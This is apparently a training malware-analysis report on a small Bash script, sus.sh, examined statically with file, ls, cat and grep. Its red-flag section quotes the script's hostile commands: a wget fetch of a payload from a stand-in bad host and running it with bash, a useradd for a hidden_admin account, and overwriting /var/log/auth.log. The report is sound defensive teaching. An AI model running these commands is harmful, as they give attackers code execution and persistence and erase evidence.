Analyst:        Abhinav Sabu
Analysis Date:  September 3, 2026
File examined:  sus.sh
Method:         Static examination only (file never executed)

---

1. SUMMARY

---

The file is a Bash shell script containing commands that would
download and execute a remote payload, create a new user account,
and overwrite the authentication log if the script were executed.
Verdict: MALICIOUS, with high confidence based on the behaviours
visible in the script.

---

2. FILE IDENTIFICATION

---

Reported type (file command):  Bourne-Again shell script,
ASCII text executable

Name vs actual type:            The filename is "sus.sh", and the
contents match a Bash shell script.
The name does not hide the file type,
but the file command confirms what
the file actually contains.

---

3. FILE PROPERTIES (ls -l)

---

Permissions:    -rw-rw-r--
Executable?:    No — there is no "x" permission in the file
permissions, so it is not currently executable
through normal Linux file execution permissions.

Owner:          kali
Size:           145 bytes
Modified:       September 3, 2026 at 22:58

---

4. CONTENTS AND RED FLAGS

---

Examined by reading (cat / less), never by running.

Red flags found:

[x] Downloads a file from a remote web address
(wget http://example-bad-site.test/payload.sh) —
this matches a fetch-a-payload pattern and introduces
external content into the system.

[x] Runs the downloaded file (bash payload.sh) —
this would execute code obtained from the remote source
and could allow an attacker to run additional commands.

[x] Creates a user account (useradd hidden_admin) —
this could be used as a persistence mechanism or to
provide an attacker with another account on the system.

[x] Clears the authentication log
(echo "" > /var/log/auth.log) —
this would overwrite the log contents and could be used
to remove evidence of activity and cover tracks.

Additional observation:
The line "wget http://example-bad-site.test/payload.sh" was
identified using grep "http". The user-creation command was
identified using grep "useradd". These searches demonstrate
how grep can quickly locate suspicious patterns in a larger
script.

---

5. VERDICT AND CONFIDENCE

---

Verdict:     MALICIOUS
Confidence:  HIGH

Evidence-based reasoning:

The script contains several behaviours commonly associated with
malicious activity. It attempts to download a remote payload using
wget and then execute it using bash. It also attempts to create a
new user account called hidden_admin, which could provide
persistence or unauthorized access. Finally, it attempts to
overwrite /var/log/auth.log, which could be used to remove evidence
and cover tracks. These behaviours together provide strong
evidence that the script is malicious-looking and dangerous if
executed. The confidence is high because the complete script was
available for static examination and its intended actions were
clear without needing to execute it.

---

6. RECOMMENDATION

---

[x] Do NOT execute the file under any circumstances.

[x] Preserve the file as evidence for further analysis. If this
were a real suspicious file, remove execute permission if
necessary without deleting the file.

[x] Escalate the file to the appropriate security or incident
response team for further investigation.

[x] Check the system for signs that the script was already run,
including the presence of a suspicious account such as
hidden_admin and changes or missing entries in authentication
logs.

[x] Investigate any downloaded payload separately in a safe,
isolated analysis environment rather than executing it on
the original system.
